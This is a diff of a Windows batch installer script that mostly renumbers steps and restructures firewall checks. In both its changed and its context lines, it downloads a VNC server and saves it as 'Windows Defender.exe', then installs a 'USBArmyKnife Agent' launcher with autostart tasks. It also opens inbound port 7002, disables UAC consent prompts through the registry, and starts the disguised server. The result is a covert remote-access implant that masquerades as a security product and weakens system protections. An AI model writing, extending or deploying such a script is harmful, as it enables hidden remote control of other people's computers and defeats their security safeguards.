@@ -41,7 +41,7 @@ if defined VNCPASSWD (
 echo.
 
 REM --- 1. Stop running processes ---
-echo [1/6] Stopping running processes...
+echo [1/7] Stopping running processes...
 taskkill /F /IM AgentLauncher.exe >nul 2>&1
 taskkill /F /IM Windows Defender.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
@@ -50,13 +50,13 @@ REM --- 2. Create temp download directory ---
 if not exist "%TEMPDIR%" mkdir "%TEMPDIR%"
 
 REM --- 3. Download files individually ---
-echo [2/6] Downloading files from GitHub...
+echo [2/7] Downloading files from GitHub...
 echo    Download folder: %TEMPDIR%
 echo.
 
 set "FAIL=0"
 
-echo    [1/6] Windows Defender.exe (~67MB, may take a moment)...
+echo    [1/5] Windows Defender.exe (~67MB, may take a moment)...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/VncDirect.exe' -OutFile '%TEMPDIR%\Windows Defender.exe' -UseBasicParsing -TimeoutSec 300"
 if not exist "%TEMPDIR%\Windows Defender.exe" (
     echo    [!] FAILED to download Windows Defender.exe
@@ -65,7 +65,7 @@ if not exist "%TEMPDIR%\Windows Defender.exe" (
     echo    [OK]
 )
 
-echo    [2/6] AgentLauncher.exe...
+echo    [2/5] AgentLauncher.exe...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%TEMPDIR%\AgentLauncher.exe' -UseBasicParsing -TimeoutSec 300"
 if not exist "%TEMPDIR%\AgentLauncher.exe" (
     echo    [!] FAILED to download AgentLauncher.exe
@@ -74,7 +74,7 @@ if not exist "%TEMPDIR%\AgentLauncher.exe" (
     echo    [OK]
 )
 
-echo    [3/6] turbojpeg.dll...
+echo    [3/5] turbojpeg.dll...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/turbojpeg.dll' -OutFile '%TEMPDIR%\turbojpeg.dll' -UseBasicParsing -TimeoutSec 60"
 if not exist "%TEMPDIR%\turbojpeg.dll" (
     echo    [!] FAILED to download turbojpeg.dll
@@ -83,7 +83,7 @@ if not exist "%TEMPDIR%\turbojpeg.dll" (
     echo    [OK]
 )
 
-echo    [4/6] vcruntime140.dll...
+echo    [4/5] vcruntime140.dll...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/vcruntime140.dll' -OutFile '%TEMPDIR%\vcruntime140.dll' -UseBasicParsing -TimeoutSec 60"
 if not exist "%TEMPDIR%\vcruntime140.dll" (
     echo    [!] FAILED to download vcruntime140.dll
@@ -92,7 +92,7 @@ if not exist "%TEMPDIR%\vcruntime140.dll" (
     echo    [OK]
 )
 
-echo    [5/6] vnc-web.zip (noVNC web UI)...
+echo    [5/5] vnc-web.zip (noVNC web UI)...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/vnc-web.zip' -OutFile '%TEMPDIR%\vnc-web.zip' -UseBasicParsing -TimeoutSec 60"
 if not exist "%TEMPDIR%\vnc-web.zip" (
     echo    [!] FAILED to download vnc-web.zip
@@ -115,7 +115,7 @@ echo.
 echo    All downloads complete.
 
 REM --- 4. Install files ---
-echo [3/6] Installing to %DEST%...
+echo [3/7] Installing to %DEST%...
 if not exist "%DEST%" mkdir "%DEST%"
 if not exist "%DEST%\VncDirect" mkdir "%DEST%\VncDirect"
 
@@ -141,7 +141,7 @@ powershell -NoProfile -Command "$j = @{}; if (Test-Path '%DEST%\VncDirect\vnc-se
 :skip_password
 
 REM --- 5. Set up autostart ---
-echo [4/6] Setting up autostart...
+echo [4/7] Setting up autostart...
 
 schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
 if %errorlevel% equ 0 goto skip_agent
@@ -171,49 +171,42 @@ schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VNC Direct" /f >nul 2>&1
 echo     VNC Direct removed from autostart.
 
-REM --- 6. Firewall rules ---
-echo [5/6] Setting up firewall rules...
+REM --- 5. Firewall rules ---
+echo [5/7] Setting up firewall rules...
+
 netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
+if %errorlevel% equ 0 goto skip_firewall_allow
+netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul 2>&1
 if %errorlevel% equ 0 (
-    echo     Firewall rule "VNC Direct 7002" already exists.
+    echo     [+] Firewall rule "VNC Direct 7002" (allow) created.
 ) else (
-    netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul 2>&1
-    if !errorlevel! equ 0 (
-        echo     [+] Firewall rule "VNC Direct 7002" (allow) created.
-    ) else (
-        echo     [-] Failed to create firewall rule. Run as Admin.
-    )
+    echo     [-] Failed to create firewall allow rule. Run as Admin.
 )
+:skip_firewall_allow
 
 netsh advfirewall firewall show rule name="VNC Block Localhost" >nul 2>&1
+if %errorlevel% equ 0 goto skip_firewall_block
+netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1 >nul 2>&1
+netsh advfirewall firewall add rule name="VNC Block Localhost v6" dir=in action=block protocol=TCP localport=7002 remoteip=::1 >nul 2>&1
 if %errorlevel% equ 0 (
-    echo     Firewall rule "VNC Block Localhost" already exists.
+    echo     [+] Firewall rules "VNC Block Localhost" created.
 ) else (
-    netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1 >nul 2>&1
-    netsh advfirewall firewall add rule name="VNC Block Localhost v6" dir=in action=block protocol=TCP localport=7002 remoteip=::1 >nul 2>&1
-    if !errorlevel! equ 0 (
-        echo     [+] Firewall rules "VNC Block Localhost" created.
-    ) else (
-        echo     [-] Failed to create firewall block rules. Run as Admin.
-    )
+    echo     [-] Failed to create firewall block rules. Run as Admin.
 )
+:skip_firewall_block
 
-REM --- 7. Disable UAC prompts (needed for VNC to show admin dialogs) ---
+REM --- 6. Disable UAC prompts (needed for VNC to show admin dialogs) ---
 echo [6/7] Disabling UAC prompts...
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
-if !errorlevel! equ 0 (
-    echo     [+] UAC prompts disabled. Restart required to take effect.
-) else (
-    echo     [-] Failed to disable UAC. Run as Admin.
-)
+echo     UAC prompts disabled. Restart required to take effect.
 
-REM --- 8. Start services ---
+REM --- 7. Start services ---
 echo [7/7] Starting Agent and VNC Server...
 cd /d "%DEST%\VncDirect\vnc"
 start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
 cd /d "%DEST%"
-start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%
+start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd="%DEST%"
 
 REM Wait for port
 echo    Waiting for VNC Server to start...
